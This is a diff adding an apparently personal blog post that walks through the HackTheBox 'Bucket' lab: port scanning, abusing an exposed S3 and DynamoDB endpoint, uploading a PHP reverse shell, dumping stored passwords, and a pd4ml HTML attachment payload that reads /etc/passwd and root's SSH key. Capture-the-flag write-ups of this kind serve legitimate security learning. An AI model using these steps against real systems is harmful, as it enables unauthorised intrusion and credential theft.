@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<meta charset="utf-8">
+<html>
+
+<head>
+	<link rel="stylesheet" href="../css/base.css"></link>
+	<link rel="stylesheet" href="../css/prism.css"></link>
+
+	<script src="../js/jquery-3.4.1.min.js"></script>
+	<script src="../js/base.js"></script>
+	<script src="../js/prism.js"></script>
+</head>
+
+<body class="post">
+	<h1 id="website-title"><a id=website-title href=../index.html>slomo</a></h1>
+
+	<h2>HackTheBox - Bucket</h2>
+	<ul>
+			<li><a href="#intro">Introduction</a></li>
+			<li><a href="#enum">Enumeration</a></li>
+			<ul>
+				<li><a href="#webserver">Webserver Investigation</a></li>
+				<li><a href="#aws">AWS Bucket Probe</a></li>
+			</ul>
+			<li><a href="#shell">Shell Access</a></li>
+			<ul>
+				<li><a href="#pspy">Using pspy</a></li>
+			</ul>
+			<li><a href="#user">User Credentials</a></li>
+			<li><a href="#priv">Privilege Escalation</a></li>
+			<ul>
+				<li><a href="#root">Root Access</a></li>
+			</ul>
+			<li><a href="#conc">Conclusions</a></li>
+	</ul>
+
+	<h2 id="intro">Introduction</h2>
+	<p>This was my first box that I got system root completely on my own, without the use of hints or other giveaways. In my opinion it was a well-designed machine with interesting challeneges and lots of good learning opportunities. As such, this report is a bit more in-depth because I wanted to capture my thought process and how I worked through each stage of the box. I hope you enjoyed it as much as I did!</p>
+
+	<h2 id="enum">Enumeration</h2>
+
+	<p>We start of with an nmap scan to see what services are available. I started by doing a quick nmap scan of the top 100 ports which turns out to be enough to progress in this box</p>
+	<pre class=language-html><code># Nmap 7.91 scan initiated Sun Jan  3 20:07:03 2021 as: nmap -sT --top-ports 100 -oN top.nmap 10.10.10.212
+
+Nmap scan report for 10.10.10.212
+Host is up (0.068s latency).
+Not shown: 98 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</code></pre>
+
+	<p>Typically I start by adding a line to my ‘/etc/hosts’ file that point at the target server. Most of these boxes seem to follow the format [boxname].htb, so I added the line '10.10.10.212	bucket.htb'. It simplifies reaching the server (instead of remembering the exact IP) and for some webserver configurations that utilize virtualhost routing it is necessary. Here's some more information on <a href="https://youtube.com/watch?v=JRPWFSzFaG0&t=248">virtualhost routing</a>.
+	</p>
+
+	<h3 id="webserver">Webserver Investigation</h3>
+	<p>We can start by taking a look at the webserver. At first glance it looks like a simple blogging site. One thing that did catch my attention was that website images were not loading. I took a look at the source code and noticed another url which the site was loading content from.</p>
+
+	<pre><code class="language-html">&lt;img src="http://s3.bucket.htb/adserver/images/bug.jpg" alt="Bug" width="160" height="160"&gt;</code></pre>
+
+	<h3 id="aws">AWS Bucket probe</h3>
+	<p>After a bit of time of poking and proding at this site, I determined that it was infact an S3 bucket and that I could use the AWS CLI to interact with it. I wasted a ton of time trying to force the CLI to point at the appropriate bucket instead of at real buckets accessible on the internet. This was indeed a reminder that you should <a href="https://docs.aws.amazon.com/cli/latest/reference/">read the documentation</a> first and then proceed with the task at hand. The exact option I needed was <i>--endpoint-url</i>. After settling that I simply needed to use some fake credentials for an aws account and I was able to interact with the bucket.</p>
+
+	<pre class="command-line" data-output="2,4,5-6,9-21" data-user="kali" data-host="kali"><code class="language-bash">cat .aws/config
+[default]
+cat .aws/credentials
+[default]
+aws_access_key_id = AKIAIOSFODNN7EXAMPLE
+aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+alias aws="aws --endpoint-url http://s3.bucket.htb --region us-east"
+aws s3api list-buckets
+{
+    "Buckets": [
+        {
+            "Name": "adserver",
+            "CreationDate": "2021-01-07T16:15:10.561876+00:00"
+        }
+    ],
+    "Owner": {
+        "DisplayName": "webfile",
+        "ID": "bcaf1ffd86f41161ca5fb16fd081034f"
+    }
+}</code></pre>
+
+	<h2 id="shell">Shell Access</h2>
+	<p>I played around for a bit trying to figure out how to upload a php shell and get it to execute on the server. I reckoned that since images in the adserver bucket were being used on the site, I might be able to upload a reverse shell that was also accessible from the site. My predictions proved true and I was able to get a reverse shell.</p>
+
+<pre class="command-line" data-output="2,5,8-10" data-user="kali" data-host="kali"><code class="language-bash">aws s3 cp tools/backdoors/revshell.php s3://adserver
+upload: tools/backdoors/revshell.php to s3://adserver/revshell.php
+# open a ncat listener in another prompt and wait a few moments
+curl http://bucket.htb/revshell.php
+
+# ---- In another terminal ---- #
+nc -nvlp 4151
+connect to [10.10.14.185] from (UNKNOWN) [10.10.10.212] 45300
+$ whoami
+www-data</code></pre>
+
+	<h3 id="pspy">Using pspy</h3>
+
+	<p>Sweet! Now let's explore a bit. First thing I did was ‘ps aux’ and I noticed that root was running some clean up scripts (which is why the adserver bucket is pretty empty despite a number of players trying to upload to it). Though we are not able to read those scripts directly we can use <a href="https://github.com/DominicBreuker/pspy">pspy</a> to monitor their actions. We copy over the file using ncat and run it. But before that, it's probably good to have a proper shell so that we don't get kicked out when we CTL-C pspy to exit. The steps to upgrade a shell <a href="https://www.daehee.com/default-reverse-shell-to-interactive-shell/">can be found here</a> using shell magic. All I had to do was use ‘python3’ instead of 'python' and it worked fine.</p>
+<pre class="command-line" data-output="2,3,5" data-user="www-data" data-host="bucket"><code class="language-bash">nc -nvlp 4040 > pspy64
+Listening on 0.0.0.0 4040
+Connection received on 10.10.14.185 42602
+md5sum pspy64  # To verifiy file was copied correctly
+e04a36bb5444f2275990567614e1f509  pspy64</code></pre>
+
+	<p>The statically compiled binaries for pspy are available for download <a href="https://github.com/DominicBreuker/pspy#download">on github</a>. Once that is copied over we can execute it and see what processes are running.</p>
+
+<pre><code class="language-html">Root script that cleans bucket and uploads files to webserver:
+2021/01/07 17:03:17 CMD: UID=0    PID=1495   | java -Djava.library.path=./DynamoDBLocal_lib -Xmx256m -jar DynamoDBLocal.jar -sharedDb -port 59901 -inMemory
+...
+2021/01/05 16:18:01 CMD: UID=0    PID=129323 |  /usr/bin/python3 /usr/bin/aws --endpoint-url=http://localhost:4566 s3 sync s3://adserver/ /root/files/ --exclude *.png --exclude *.jpg
+2021/01/05 16:23:01 CMD: UID=0    PID=129741 | /usr/bin/python3 /usr/bin/aws --endpoint-url=http://localhost:4566 s3 rm s3://adserver --recursive
+2021/01/05 16:23:02 CMD: UID=0    PID=129758 | cp -R /root/files/index.html /var/www/html/
+2021/01/05 16:23:02 CMD: UID=0    PID=129771 | /usr/bin/python3 /usr/bin/aws --endpoint-url=http://localhost:4566 s3 rb s3://adserver
+2021/01/05 16:23:03 CMD: UID=0    PID=129775 | /usr/bin/python3 /usr/bin/aws --endpoint-url=http://localhost:4566 s3 mb s3://adserver
+2021/01/05 16:23:03 CMD: UID=0    PID=129781 | /usr/bin/python3 /usr/bin/aws --endpoint-url=http://localhost:4566 s3 sync /root/backups/ s3://adserver
+2021/01/05 16:23:04 CMD: UID=0    PID=129802 | cp -R /root/backups/index.html /var/www/html/
+</code></pre>
+
+	<h2 id="user">User Credentials</h2>
+	<p>The aws executions are essentially the commands that allow us to upload our webshell. The first line indicates that dynamodb is also being used, and we can guess that it probably running on http://localhost:4566. Well maybe that's a bit presumptious ;)</p>
+
+<pre class="command-line" data-output="2-9,12-16,18-35" data-user="www-data" data-host="bucket"><code class="language-bash">ss -antl
+State		Recv-Q		Send-Q		Local Address:Port		Peer Address:Port		Process
+LISTEN		0		    4096		127.0.0.53%lo:53		0.0.0.0:*
+LISTEN		0		    4096		127.0.0.1:4566			0.0.0.0:*
+LISTEN		0		    128			0.0.0.0:22				0.0.0.0:*
+LISTEN		0		    4096		127.0.0.1:43519			0.0.0.0:*
+LISTEN		0		    511			127.0.0.1:8000			0.0.0.0:*
+LISTEN		0		    511			*:80				    *:*
+LISTEN		0		    128			[::]:22				    [::]:*
+alias aws="aws --endpoint-url http://localhost:4566"
+aws dynamodb list-tables
+{
+    "TableNames": [
+        "users"
+    ]
+}
+aws dynamodb scan --table-name users
+{
+    "Items": [
+        {
+           ...
+        },
+        {
+            "password": {
+                "S": "n2vM-<_K_Q:.Aa2"
+            },
+            "username": {
+                "S": "Sysadm"
+            }
+        }
+    ],
+    "Count": 3,
+    "ScannedCount": 3,
+    "ConsumedCapacity": null
+}</code></pre>
+
+	<p>We can try all the passwords in this table against the user “roy” found in /etc/passwd. And as expected one of them works! We browse to roy's home directory and retrieve user.txt. In the future we can use ssh to log into roy@bucket.htb with the given password.</p>
+
+	<h2 id="priv">Privilege Escalation</h2>
+	<p>Now we can try to figure out how to elevate our priveleges to root. Something peaked my interest when running pspy, specifically the command “/bin/sh -c rm /var/www/bucket-app/files/*”. I went to the that directory and found an index.php file that had some interesting content. I copied over the entire directory to my kali machine and tried to understand what was going on.</p>
+
+<pre><code class="language-php">&lt;?php
+require 'vendor/autoload.php';
+use Aws\DynamoDb\DynamoDbClient;
+if($_SERVER["REQUEST_METHOD"]==="POST") {
+        echo "Hello";
+        if($_POST["action"]==="get_alerts") {
+                echo "Hi";
+                exit(0);
+                date_default_timezone_set('America/New_York');
+                $client = new DynamoDbClient([
+                        'profile' => 'default',
+                        'region'  => 'us-east-1',
+                        'version' => 'latest',
+                        'endpoint' => 'http://localhost:4566'
+                ]);
+
+                $iterator = $client->getIterator('Scan', array(
+                        'TableName' => 'alerts',
+                        'FilterExpression' => "title = :title",
+                        'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
+                ));
+
+                foreach ($iterator as $item) {
+                        $name=rand(1,10000).'.html';
+                        file_put_contents('files/'.$name,$item["data"]);
+                }
+                passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
+        }
+}
+else
+{
+?></code></pre>
+
+	<p>It seems that when we access this php file (presumably through a webserver) the dynamodb will be queried. It will essentially look for any articles related to ransomeware and create an html + corresponding pdf file to be copied to the files directory. But where was this index.php being hosted? I tried accessing http://localhost:4566/index.php and got: <pre>{"status": "running"}</pre>Well, that's simply the bucket again... I looked back at the ss command I ran earlier to see which tcp ports were open and listening. I went through the list and it seemed like the file was being hosted at http://localhost:8000.</p>
+
+	<p>At this point I learned a bit about dynamodb through its reference documentation. I specifically wanted to understand exactly <a href="https://docs.aws.amazon.com/aws-sdk-php/v3/api/api-dynamodb-2012-08-10.html#scan">how the filtering was working</a> and how to <a href="https://docs.aws.amazon.com/cli/latest/reference/dynamodb/create-table.html">create a table</a> that matched the expected schema. After a bit of time I came up with the following command to create our desired files.</p>
+
+<pre class="command-line" data-output="3-6,9,12" data-user="roy" data-host="bucket"><code class="language-bash"># Create a table with the correct schema
+aws --endpoint-url="http://localhost:4566" --region=us-east dynamodb create-table \
+    --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \
+    --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \
+    --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5
+
+# Insert an element into our table using the data stored in ./test.json
+aws dynamodb put-item --table-name alerts --item file://test.json
+
+# Make a POST request to the server to trigger the html & pdf creation
+curl http://127.0.0.1:8000/index.php -d "action=get_alerts"</code></pre>
+
+	<p>I got a bit stuck at what to do after this. I assumed that the exploit vector would work similar to how we obtained our first webshell (i.e. like making a request to http://localhost:8000/files/webshell.php ).</p>
+
+	<h3 id="root">Root access</h3>
+	<p>After some trial and error, and some lucky googling, I realized that I might be able to include root files during the pdf generation phase of the exploit. I read about the pd4ml tool and I found some <a href="https://pd4ml.tech/support-topics/usage-examples/#add-attachment">interesting functionality</a> when looking through their documentation. I crafted an exploit with the following html</p>
+
+
+<pre><code class="language-html">&lt;html>&lt;pd4ml:attachment description="attached.txt" type="paperclip" src="file:///etc/passwd">&lt;/pd4ml:attachment>&lt;/html></pre></code>
+
+	<p>Testing on my own gave me an error about retrieving a certain gif image, but a quick test on the server proved successful. I proceeded to attach the /root/.ssh/id_rsa file and successfully login over ssh!</p>
+
+	<h2 id="conc">Conclusions</h2>
+	<p>This box took me a good deal of time to work through, but I'm glad I was successful in the end.</p>
+</body>
+<footer></footer>
+</html>
